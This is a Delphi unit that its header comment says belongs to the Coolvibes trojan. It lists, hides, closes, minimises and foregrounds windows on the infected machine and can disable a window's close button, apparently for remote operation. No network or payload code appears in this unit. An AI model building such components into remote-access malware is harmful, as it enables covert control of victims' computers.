{Unit perteneciente al troyano Coolvibes que contiene todas las funciones
para manejar ventanas}
unit UnitWindows;

interface

uses
  Windows,
  Messages,
  SysUtils;

function GetWins(MostrarOcultas:Boolean): string;
procedure CerrarVentana(Handle: HWND);
procedure MostrarVentana(Handle: HWND);
procedure OcultarVentana(Handle: HWND);
procedure MaximizarVentana(Handle: HWND);
procedure MinimizarVentana(Handle: HWND);
procedure MinimizarTodas();
procedure BotonCerrar(YesNo: boolean; Handle: HWND);
function AppActivateHandle(WindowHandle: HWND): boolean;

implementation

var
  Cadena: string;
  MO : boolean; //MostrarOcultas
function GetWins(MostrarOcultas:Boolean): string;

  function EnumWindowProc(Hwnd: HWND; i: integer): boolean; stdcall;
  var
    Titulo: string;
    Estado: string;
    Status: TWindowPlacement;
  begin
    if (Hwnd = 0) then
    begin
      Result := False;
    end
    else
    begin
      SetLength(Titulo, 255);
      SetLength(Titulo, GetWindowText(Hwnd, PChar(Titulo), Length(Titulo)));
      Status.length := SizeOf(Status);
      GetWindowPlacement(Hwnd, @Status);
      
      if(not IsWindowVisible(Hwnd)) then
        estado := '0'
      else
      if Status.showCmd = SW_SHOWMAXIMIZED then
        estado := '1'
      else if Status.showCmd = SW_SHOWNORMAL then
        estado := '2'
      else if Status.showCmd = SW_SHOWMINIMIZED then
        estado := '3';

      if ((IsWindowVisible(Hwnd) or MO) and (Titulo <> '')) then
      begin
        Cadena := Cadena + Titulo + '|' + IntToStr(Hwnd) + '|'+ Estado + '|';
      end;
      Result := True;
    end;
  end;

begin
  Cadena := '';
  MO := MostrarOcultas;
  EnumWindows(@EnumWindowProc, 0);
  Result := Cadena;
end;

procedure CerrarVentana(Handle: HWND);
begin
  SendMessage(Handle, WM_CLOSE, 0, 0);
end;

procedure MostrarVentana(Handle: HWND);
begin
  ShowWindow(Handle, SW_SHOW);
end;

procedure OcultarVentana(Handle: HWND);
begin
  ShowWindow(Handle, SW_HIDE);
end;

procedure MaximizarVentana(Handle: HWND);
begin
  ShowWindow(Handle, SW_MAXIMIZE);
end;

procedure MinimizarVentana(Handle: HWND);
begin
  ShowWindow(Handle, SW_MINIMIZE);
end;

procedure MinimizarTodas();
begin
  keybd_event(VK_LWIN, MapvirtualKey(VK_LWIN, 0), 0, 0);
  keybd_event(Ord('M'), MapvirtualKey(Ord('M'), 0), 0, 0);
  keybd_event(Ord('M'), MapvirtualKey(Ord('M'), 0), KEYEVENTF_KEYUP, 0);
  keybd_event(VK_LWIN, MapvirtualKey(VK_LWIN, 0), KEYEVENTF_KEYUP, 0);
end;

procedure BotonCerrar(YesNo: boolean; Handle: HWND);
var
  hMnu: THandle;
begin
  if YesNo = False then
  begin
    hMnu := GetSystemMenu(Handle, False);
    EnableMenuItem(hMnu, SC_CLOSE, MF_GRAYED);
  end
  else
  begin
    hMnu := GetSystemMenu(Handle, False);
    EnableMenuItem(hMnu, SC_CLOSE, MF_ENABLED);
  end;
end;

function AppActivateHandle(WindowHandle: HWND): boolean;
begin
  try
    Result := True;
    if (WindowHandle <> 0) then
    begin
      SendMessage(WindowHandle, WM_SYSCOMMAND, SC_HOTKEY, WindowHandle);
      SendMessage(WindowHandle, WM_SYSCOMMAND, SC_RESTORE, WindowHandle);
      SetForegroundWindow(WindowHandle);
    end
    else
      Result := False;
  except
    on Exception do
      Result := False;
  end;
end;


end.
 